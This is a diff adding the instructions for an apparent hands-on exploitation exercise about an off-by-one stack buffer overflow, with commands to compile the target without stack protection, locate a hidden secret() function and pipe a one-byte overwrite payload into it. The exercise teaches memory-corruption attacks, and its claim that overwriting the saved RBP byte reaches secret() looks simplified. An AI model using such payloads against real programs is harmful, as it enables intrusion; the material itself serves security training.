@@ -1,0 +1,19 @@
+Exercise 03 — Off-by-One
+==========================
+
+A loop uses <= instead of <.
+It writes 17 bytes into a 16-byte buffer.
+That single extra byte lands on the saved RBP.
+
+The function secret() exists in the binary but is never called.
+
+  Compile:
+    gcc -fno-stack-protector -no-pie -o target target.c
+
+  Find the address of secret():
+    nm target | grep secret
+
+  Send 16 bytes of padding + 1 byte (the LSB of secret's address):
+    python3 -c "import sys; sys.stdout.buffer.write(b'A' * 16 + bytes([0xXX]))" | ./target
+
+When you see [SUCCESS], run `horizon done`.
